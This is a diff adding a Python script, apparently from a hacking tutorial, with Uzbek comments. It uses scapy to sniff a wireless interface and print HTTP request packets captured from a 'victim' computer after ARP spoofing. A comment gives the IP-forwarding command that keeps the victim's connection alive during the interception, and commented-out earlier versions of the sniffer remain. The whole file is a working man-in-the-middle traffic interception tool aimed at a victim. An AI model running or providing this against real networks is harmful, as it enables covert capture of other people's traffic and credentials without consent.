@@ -1,0 +1,41 @@
+#!/usr/bin/env python
+#Dasturni ishga tushurgach jabrlanuvchi kampyuterida internet ishlamay qolsa quyudagi kod kiritiladi
+#echo 1 > /proc/sys/net/ipv4/ip_forward
+import http
+
+#ARPspoof orali jabrlanuvchi kampyuterini bizning kampyuterga burib olib so'ngra barcha packetlarni o'qiymiz
+# import scapy.all as scapy
+#
+# def sniff(interface):
+#     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet, fileter="udp") #iface-interface, store-xotirada saqlash yoki saqlamaslik, prn-"calback" har doim natija chiqganda kiritilgan funksiya ishlasin.
+#
+# def process_sniff_packet(packet):
+#     print(packet)#Barcha kelayotgan packetlarni ekranga chiqarish
+#
+# sniff("wlan0")
+
+    #http port=80 packetlardan boshqa barchasini filtirlay oladigan filter argumentdan foydalanamiz
+
+import scapy.all as scapy
+
+# def sniff(interface):
+#     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet, filter="udp") #iface-interface, store-xotirada saqlash yoki saqlamaslik, prn-"calback" har doim natija chiqganda kiritilgan funksiya ishlasin.
+#
+# def process_sniff_packet(packet):
+#     print(packet)#Barcha kelayotgan packetlarni ekranga chiqarish
+#
+# sniff("wlan0")
+
+    #http packetlarini saralashimiz uchun pip yordamida scapy_http ni o'rnatishimiz kerak bo'ladi.
+
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet) #iface-interface, store-xotirada saqlash yoki saqlamaslik, prn-"calback" har doim natija chiqganda kiritilgan funksiya ishlasin.
+
+def process_sniff_packet(packet):
+    if packet.haslayer(http.HTTPRequest): #haslayer scapy ichida mavjud bo'lib u darajani tekshiradi. yani http darajadagi packet bor yoki yo'q
+        print(packet)#Barcha kelayotgan packetlarni ekranga chiqarish
+
+sniff("wlan0")
